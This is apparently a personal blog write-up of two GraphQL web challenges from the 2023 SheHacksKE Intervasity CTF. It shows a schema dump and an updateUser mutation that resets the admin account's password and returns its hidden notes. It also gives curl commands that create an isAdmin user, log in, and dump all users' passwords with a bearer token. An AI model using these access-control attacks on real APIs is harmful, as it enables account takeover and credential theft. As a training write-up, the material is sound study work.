---
layout: article
title : SheHacksKE Intervasity CTF 2023 Writeup
tags: web graphql
---

# SheHacksKE Intervasity CTF 2023 Web Writeups

![image](https://github.com/k0imet/k0imet.github.io/assets/60982828/11161aea-e301-4f2c-a944-7ae8e5b79fbf)


- On friday the 22nd of September 2023 I had an opportunity to take part in the Annual Intervasity CTF from SheHacksKE with some friends from fr334aks under the alias "Seekers" which was partly online and also onsite at USIU Africa,
We ended up winning 🥇 beating atleast other 80 teams that had atleast a single solve in the CTF


## Graph1 

![image](https://github.com/k0imet/k0imet.github.io/assets/60982828/ed185ee7-3496-4482-af0f-c1942f213b00)


- This was a fairly easy challenge, all that was required of us was to query the flag using the GetFlag query that would fetch the flag from the Flagtable. 

![image](https://github.com/k0imet/k0imet.github.io/assets/60982828/ee7de725-3933-42db-8d2e-ebe167d54665)

Base64 decoding the encoded strings gives the flag :) 


## Graph2 

![image](https://github.com/k0imet/k0imet.github.io/assets/60982828/bbc99130-6875-4498-8fbf-aa85efe9f75e)


Spent sometime here as i haven't solved alot of graphql challenges before, but in the end it was worth it,
The challenge as the description said is for one to fetch or retrieve the hidden note,
This hidden note probably belonged to an admin.
I copied the Introspection Query from Graphql voyager to get a better understanding of the queries, available relationships etc. 


![image](https://github.com/k0imet/k0imet.github.io/assets/60982828/751ae80a-6fa6-406a-8122-fccc989fac6a)

I also used graphqlmap to gather more information as well, including mutations and potential injection points or queries that I missed.

![image](https://github.com/k0imet/k0imet.github.io/assets/60982828/90f555c9-c5c5-48c0-9dae-07c97c452657)

![image](https://github.com/k0imet/k0imet.github.io/assets/60982828/a88f540b-30aa-42eb-be2c-03cbbaf2af86)


### what I tried and failed 


- Creating a User with user id 1 :x:
- Forging the Session Key (Authentication bearer) to include isAdmin user property as True :x:
- Creating a User with isAdmin user property as True :x:
- Modifying The Note with ID 1 to any title and hence be able to read the new note :x:

### What worked 

- Modify User with ID 1 to our controlled password (?) and return the current data along with the admin notes :heavy_check_mark:
 

## Solution 

```bash 

GraphQLmap > dump_via_fragment
============= [SCHEMA] ===============
e.g: name[Type]: arg (Type!)

00: Query
        findNote[]: id (Int!), 
        userNotes[Notes]: 
        getusers[User]: 
        getFlag[FlagTable]: 
01: Notes
        id[ID]: 
        title[]: 
        body[]: 
        userId[]: 
        user[]: 
05: User
        id[ID]: 
        firstName[]: 
        lastName[]: 
        isAdmin[]: 
        email[String]: 
        password[]: 
        notes[Notes]: 
07: FlagTable
        id[ID]: 
        flag[]: 
08: Mutations
        addNote[]: body (String!), title (String!), 
        (?) mutation{addNote(body:"string",title:"string"){ result }}
        updateNote[]: body (String!), noteId (Int!), title (String!), 
        (?) mutation{updateNote(body:"string",noteId:1,title:"string"){ result }}
        deleteNote[]: id (Int!), 
        (?) mutation{deleteNote(id:1){ result }}
        createUser[]: email (String!), firstName (String!), lastName (String!), password (String!), 
        (?) mutation{createUser(email:"string",firstName:"string",lastName:"string",password:"string"){ result }}
        logIn[]: email (String!), password (String!), 
        (?) mutation{logIn(email:"string",password:"string"){ result }}
        updateUser[]: id (Int!), lastName (String!), password (String!), 
        (?) mutation{updateUser(id:1,lastName:"string",password:"string"){ result }}
09: addNote
        ok[]: 
        note[]: 
10: updateNote
        ok[]: 
        note[]: 
11: deleteNote
        ok[]: 
        note[]: 
12: createUser
        ok[]: 
        user[]: 
13: logIn
        ok[]: 
        tokens[]: 
14: Token
        id[ID]: 
        user[]: 
        accessToken[]: 
        refreshToken[]: 
15: updateUser
        ok[]: 
        user[]: 
16: __Schema
17: __Type
19: __Field
20: __InputValue
21: __EnumValue
22: __Directive
```

As you can see on the `updateUser` mutation graphqlmap provided us with a sample query that we can use to update user info as

```graphql
 updateUser[]: id (Int!), lastName (String!), password (String!), 
        (?) mutation{updateUser(id:1,lastName:"string",password:"string"){ result }}`

```

I later modified this query to  

```graphql 
mutation {
  updateUser(id: 1, lastName: "Admin", password: "admin") {
    ok
    user {
      id
      email
      firstName
      lastName
      password
      notes {
        id
        title
        body
      }
    }
  }
}

```
which can be defined as 

```graphql 

updateUser
  ok[]: 
  user[]:
    id[]
    email[]
    firstName[]
    lastName[]
    password[]
    notes[]:
      id[]
      title[]
      body[]

```
![image](https://github.com/k0imet/k0imet.github.io/assets/60982828/a5b2ab15-2c83-4a37-a22c-f8c768338a00)

- Decode for full flag

### Misc 

#### createuser 

```zsh
curl -X POST -H "Content-Type: application/json" --data '{ "query": "mutation { createUser(firstName: \"NewUser\", lastName: \"Admin\", email: \"newuser@admin.com\", password: \"EasyPassword123\", isAdmin: true) { ok user { id firstName lastName email isAdmin } } }" }' http://128.199.47.43:5000/graphql
```

#### login 

```zsh
curl -X POST \
-H "Content-Type: application/json" \
--data '{ "query": "mutation { logIn(email: \"koimet@koimet.com\", password: \"koimet") { ok tokens { accessToken refreshToken } } }" }' \
http://128.199.47.43:5000/graphql
```

#### GetUsers

```zsh
curl -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY5NTM3NTA1NCwianRpIjoiMDU3ZjY3YWYtNGRlYS00MWYzLTgwMTMtYmVkMDg3YTg0Yjc3IiwidHlwZSI6ImFjY2VzcyIsImlkZW50aXR5IjoibmV3dXNlckBhZG1pbi5jb20iLCJuYmYiOjE2OTUzNzUwNTQsImV4cCI6MTY5NTM3NTk1NH0.g0SJZtVyKQfdv-vlZJc8zfM9F4HRN00bMivuqn-RNe8" --data '{ "query": "{ getusers { firstName lastName isAdmin email password notes { id title body userId } } }" }' http://128.199.47.43:5000/graphql
```


#### userNotes 

```zsh
curl -X POST \
-H "Content-Type: application/json" \
-H "Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY5NTM3NTA1NCwianRpIjoiMDU3ZjY3YWYtNGRlYS00MWYzLTgwMTMtYmVkMDg3YTg0Yjc3IiwidHlwZSI6ImFjY2VzcyIsImlkZW50aXR5IjoibmV3dXNlckBhZG1pbi5jb20iLCJuYmYiOjE2OTUzNzUwNTQsImV4cCI6MTY5NTM3NTk1NH0.g0SJZtVyKQfdv-vlZJc8zfM9F4HRN00bMivuqn-RNe8" \
--data '{ "query": "{ userNotes { id title body userId user { firstName lastName } } }" }' \
http://128.199.47.43:5000/graphql
```


## References 

⚫ [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql)
⚫ [ctftime](https://ctftime.org/tasks/?hidden-tags=graphql)
